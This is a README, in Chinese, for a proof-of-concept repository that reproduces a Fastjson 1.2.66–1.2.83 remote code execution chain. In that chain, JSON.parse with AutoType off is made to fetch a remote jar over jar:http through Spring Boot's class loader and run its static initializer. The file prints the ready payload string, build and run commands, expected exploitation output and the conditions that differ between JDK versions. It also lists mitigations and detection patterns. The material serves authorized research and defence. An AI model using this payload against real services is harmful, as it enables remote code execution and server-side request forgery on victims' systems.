# Fastjson 1.2.66–1.2.83 JsonType 资源探测纯库 RCE PoC

> **仓库地址：** https://github.com/ThanatosXingYu/2026FastjsonPoC  
> 仅用于授权安全研究、本地复现与防御验证。禁止对未授权目标使用。

## 结论（本仓库已本地复现）

在 **AutoType 默认关闭** 的前提下，仅调用：

```java
JSON.parse(payload);
```

即可在特定运行时条件下完成 **远程字节码加载 + 类初始化（`<clinit>`）**，属于 **parse 阶段纯库一键 RCE**（无需业务二次 `execute()` / 反射重绑）。

### 完整 RCE 条件

| 条件 | 说明 |
| --- | --- |
| fastjson | **1.2.66 – 1.2.83**（含 `@JSONType` 资源探测路径） |
| ClassLoader | Spring Boot 经典 FatJar 的 `LaunchedURLClassLoader`，或自定义会把 jar URL 当资源解析的 ClassLoader |
| JDK | **完整 RCE：JDK 8**；JDK 9+ 仍可 **SSRF 拉 jar**，但 `defineClass` 因非法类名失败 |
| 网络 | 目标进程可访问攻击者 HTTP（本 PoC 默认 `127.0.0.1:18080`） |
| AutoType | **关闭亦可**（探测到 `@JSONType` 后走信任分支） |

### 与历史 RCE 的差异

| 项目 | 历史常见链 | 本链（JsonType） |
| --- | --- | --- |
| 入口 | `@type` + 黑名单绕过 / expectClass + gadget | `@type` 被拼成 **资源 URL**，触发 `getResourceAsStream` |
| 依赖 gadget | `JdbcRowSetImpl` / `TemplatesImpl` 等 | **无经典 gadget 黑名单对象** |
| 执行点 | 反序列化 setter / 二次调用 | **远程类 `<clinit>`**（parse 内 load/init） |
| 环境 | 视具体 gadget | **强依赖 ClassLoader + JDK8** |

## 原理（极简）

`ParserConfig.checkAutoType` 在 AutoType 关闭时仍会：

```java
String resource = typeName.replace('.', '/') + ".class";
is = classLoader.getResourceAsStream(resource);
// 扫描字节码是否含 @JSONType
// 若有，则视为可加载类型
clazz = TypeUtils.loadClass(typeName, classLoader, cacheClass);
```

Payload 形态：

```json
{"@type":"jar:http:..2130706433:18080.probe!.POC","x":1}
```

- `2130706433` = `127.0.0.1` 的整数形式  
- `.` → `/` 后变为：`jar:http://2130706433:18080/probe!/POC.class`  
- Spring Boot `LaunchedURLClassLoader` 会按 **jar:http URL** 拉取远程 jar 并定义类  
- 类内 `@JSONType` + `<clinit>` 写文件 / 执行逻辑 → RCE

## 目录

```text
.
|-- README.md
|-- LICENSE
|-- requirements.txt          # 可选；默认不用第三方包
|-- payloads/payload.json
|-- scripts/
|   |-- fetch-deps.sh
|   `-- build-harness.sh
|-- src/main/java/
|   |-- Gen.java              # ASM 生成非法 internal name + @JSONType + <clinit>
|   |-- Test.java             # 普通 AppClassLoader 基线
|   |-- Test2.java            # LaunchedURLClassLoader 完整路径
|   |-- FatRunner.java
|   `-- POC.java
|-- poc/serve_probe.py        # 可选：单独托管 probe.jar
`-- results_sample/           # 本机复现摘录（JDK8 RCE / JDK21 SSRF-only）
```

## 本机复现（推荐：内置 harness，一键）

### 0. 依赖

- **JDK 8**（完整 RCE 必须）  
- `curl`、`jar`（JDK 自带）  
- 可选：Python 3（仅 `poc/serve_probe.py`）

### 1. 构建

```bash
cd fastjson-jsontype-rce-poc
bash scripts/build-harness.sh
```

脚本会下载到 `lib/`：

- `fastjson-1.2.83.jar`
- `spring-boot-loader-2.7.18.jar`
- `spring-boot-loader-1.5.22.RELEASE.jar`
- `asm-9.6.jar`

并生成：

- `target/classes/*`
- `probe.jar`（内部类名：`jar:http://2130706433:18080/probe!/POC`，`<clinit>` 创建 `PWNED2`）

### 2. 基线：普通 classpath（预期失败 / 无出网）

```bash
# 使用 JDK 8
java -cp "target/classes:lib/fastjson-1.2.83.jar" Test parse-default
```

预期：

- `autoType is not support`
- `[server] requests received: 0`
- **无** `PWNED2`

### 3. 完整 RCE：Spring Boot 2.7 Loader + JDK 8

```bash
# 确保没有旧标记
python3 -c "from pathlib import Path; Path('PWNED2').unlink(missing_ok=True)"

java -cp "target/classes:lib/fastjson-1.2.83.jar:lib/spring-boot-loader-2.7.18.jar" Test2 sb27-parse

ls -la PWNED2
```

预期关键输出：

```text
REMOTE POC <clinit> EXECUTED (class defined from jar:http URL)
[parse] parsed -> jar:http:..2130706433:18080.probe!.POC ...
[server] requests: 4
[server] ... GET /probe HTTP/1.1
[pwned] PWNED2 exists: true
```

### 4. 其它模式

```bash
# 直接 loadClass
java -cp "target/classes:lib/fastjson-1.2.83.jar:lib/spring-boot-loader-2.7.18.jar" Test2 sb27-load

# Spring Boot 1.5 loader
java -cp "target/classes:lib/fastjson-1.2.83.jar:lib/spring-boot-loader-1.5.22.RELEASE.jar" Test2 sb15-parse

# 仅探测 getResource / checkAutoType / FatRunner
java -cp "target/classes:lib/fastjson-1.2.83.jar:lib/spring-boot-loader-2.7.18.jar" Test2 sb27-direct
java -cp "target/classes:lib/fastjson-1.2.83.jar:lib/spring-boot-loader-2.7.18.jar" Test2 sb27-check
java -cp "target/classes:lib/fastjson-1.2.83.jar:lib/spring-boot-loader-2.7.18.jar" Test2 sb27-fatrun
```

### 5. JDK 9+（本机若只有 21，可验证 SSRF-only）

同一命令在 **JDK 21** 上通常看到：

```text
java.lang.ClassFormatError: Illegal class name "jar:http://2130706433:18080/probe!/POC"
[server] requests: 4   # SSRF 仍发生
[pwned] PWNED2 exists: false
```

## Payload

```json
{"@type":"jar:http:..2130706433:18080.probe!.POC","x":1}
```

- 端口可用系统属性覆盖：`-Dpoc.port=18080`
- 落地文件名：`-Dpoc.pwnedFile=PWNED2`（生成字节码时生效，见 `Gen.java`）

## 本仓库本地实证摘要

| 环境 | 命令 | 出网 | RCE |
| --- | --- | --- | --- |
| JDK 8 + plain classpath | `Test parse-default` | 否 | 否 |
| **JDK 8 + SB 2.7 LaunchedURLClassLoader** | **`Test2 sb27-parse`** | **是** | **是（PWNED2）** |
| JDK 8 + SB 1.5 loader | `Test2 sb15-parse` | 是 | 是 |
| JDK 21 + SB 2.7 loader | `Test2 sb27-parse` | 是 | 否（ClassFormatError） |

摘录日志见 `results_sample/`。

## 防御建议

1. `-Dfastjson.parser.safeMode=true`  
2. 迁移 **fastjson2** / 停用 1.x 解析不可信输入  
3. 出站网络收敛（阻断任意 HTTP jar 拉取）  
4. 优先 JDK 9+（阻断本链 defineClass，**不能**单独消除 SSRF）  
5. 监控 `@type` 中含 `jar:`、`!`、`..`、整数 IP（如 `2130706433`）等模式  
6. 慎用 `ParserConfig.setDefaultClassLoader` 指向可解析远程 URL 的 Loader  

## 参考

- 上游研究 harness 思路：https://github.com/wouijvziqy/Fastjson-JsonType-RCE-PoC  
- fastjson `ParserConfig.checkAutoType` 中 `@JSONType` 资源探测段  
- Spring Boot `LaunchedURLClassLoader` / nested jar URL Handler  

## 免责声明

本项目用于防御与授权复现。使用者自行承担合规责任。
